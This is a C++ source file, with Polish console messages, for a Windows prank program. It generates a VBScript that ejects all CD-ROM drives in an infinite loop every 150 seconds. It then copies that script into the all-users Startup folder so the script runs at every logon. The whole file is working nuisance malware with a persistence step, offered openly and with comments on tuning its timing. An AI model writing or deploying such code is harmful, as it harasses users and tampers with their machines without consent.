#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

void breed()
{
	fstream script;
	ofstream outfile("script.vbs");
	script.open("script.vbs", ios::in | ios::out);
	
	// credits for liam6058 for script :)
	//http://www.instructables.com/id/make-an-annoying-program-that-opens-and-closes-all/
	//some black magic
	script << "do \nDim ts \nDim strDriveLetter \nDim intDriveLetter \nDim fs 'As Scripting.FileSystemObject \nConst CDROM = 4 \nOn Error Resume Next \nSet fs = CreateObject(\"Scripting.FileSystemObject\")" << endl;
	script << "strDriveLetter = \"\"\nFor intDriveLetter = Asc(\"A\") To Asc(\"Z\")\nErr.Clear\nIf fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then\nIf Err.Number = 0 Then\nstrDriveLetter = Chr(intDriveLetter)" << endl;
	script << "Exit For\nEnd If\nEnd If\nNext\nSet oWMP = CreateObject(\"WMPlayer.OCX.7\" )\nSet colCDROMs = oWMP.cdromCollection\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null" << endl;
	script << "For d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nset owmp = nothing\nset colCDROMs = nothing\nWScript.Sleep 150000\nloop\n" << endl; // change 1 500 000 to another value
																																										   // 600 000 - 10 mi
}

bool copyFile(const char *SRC, const char* DEST) //copy file
{
	std::ifstream src(SRC, std::ios::binary);
	std::ofstream dest(DEST, std::ios::binary);
	dest << src.rdbuf();
	return src && dest;
}


int main()
{
	fstream script;
	script.open("script.vbs", ios::in | ios::out); // opening file

	if (script.good() == true)
			{
				cout << "plik jest\n" << endl; //if file exist do nothing
			}
	else
			{
				cout << "brak pliku, tworzenie nowego \n" << endl;
				breed(); // no file ? breed new
			}

	script.close();

	copyFile("G:\\script.vbs", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script2.vbs"); // copy to global autostart (for all users)
	cout << "WE DID PATRICK WE SAVED THE CITY" << endl;


	cin.get();
	cin.get();

}
